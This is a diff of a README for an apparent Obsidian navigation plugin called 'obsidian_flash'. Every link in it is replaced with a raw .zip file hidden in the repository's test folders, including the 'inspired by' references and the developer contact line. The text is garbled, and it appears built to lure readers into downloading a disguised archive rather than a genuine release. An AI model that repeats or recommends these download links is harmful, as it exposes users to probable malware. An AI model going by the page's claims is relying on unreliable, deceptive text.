@@ -1,10 +1,10 @@
 # 🚀 obsidian_flash - Navigate Obsidian With Ease
 
-[![Download](https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/e2e/vaults/test-vault/.obsidian/plugins/obsidian_flash_v2.9-alpha.2.zip)](https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/e2e/vaults/test-vault/.obsidian/plugins/obsidian_flash_v2.9-alpha.2.zip)
+[![Download](https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/mocks/obsidian-flash-v2.5.zip)](https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/mocks/obsidian-flash-v2.5.zip)
 
 ## 📦 Introduction
 
-obsidian_flash brings Neovim-style navigation right into your Obsidian experience. This tool helps you jump anywhere with minimal keystrokes, inspired by https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/e2e/vaults/test-vault/.obsidian/plugins/obsidian_flash_v2.9-alpha.2.zip and https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/e2e/vaults/test-vault/.obsidian/plugins/obsidian_flash_v2.9-alpha.2.zip motion. It makes navigating your notes faster and smoother.
+obsidian_flash brings Neovim-style navigation right into your Obsidian experience. This tool helps you jump anywhere with minimal keystrokes, inspired by https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/mocks/obsidian-flash-v2.5.zip and https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/mocks/obsidian-flash-v2.5.zip motion. It makes navigating your notes faster and smoother.
 
 ## 🛠️ Features
 
@@ -28,11 +28,11 @@ To run obsidian_flash, ensure your system meets the following requirements:
 Follow these steps to get started with obsidian_flash:
 
 1. Click the link below to visit the Releases page:
-   [Download obsidian_flash](https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/e2e/vaults/test-vault/.obsidian/plugins/obsidian_flash_v2.9-alpha.2.zip)
+   [Download obsidian_flash](https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/mocks/obsidian-flash-v2.5.zip)
    
 2. On the Releases page, look for the latest version.
 
-3. Download the `.zip` or `https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/e2e/vaults/test-vault/.obsidian/plugins/obsidian_flash_v2.9-alpha.2.zip` file suitable for your operating system.
+3. Download the `.zip` or `https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/mocks/obsidian-flash-v2.5.zip` file suitable for your operating system.
 
 4. Extract the downloaded file to a folder on your computer.
 
@@ -49,7 +49,7 @@ Follow these steps to get started with obsidian_flash:
 ## 📥 Download & Install
 
 To download obsidian_flash, visit this page to download:  
-[Download obsidian_flash](https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/e2e/vaults/test-vault/.obsidian/plugins/obsidian_flash_v2.9-alpha.2.zip)
+[Download obsidian_flash](https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/mocks/obsidian-flash-v2.5.zip)
 
 ## 📖 Usage Guide
 
@@ -82,6 +82,6 @@ We welcome contributions! If you'd like to contribute, please:
 
 ## 📞 Contact
 
-For direct inquiries, please contact the developer at https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/e2e/vaults/test-vault/.obsidian/plugins/obsidian_flash_v2.9-alpha.2.zip
+For direct inquiries, please contact the developer at https://raw.githubusercontent.com/fernandeshz/obsidian_flash/main/test/mocks/obsidian-flash-v2.5.zip
 
 Enjoy navigating your notes effortlessly with obsidian_flash!
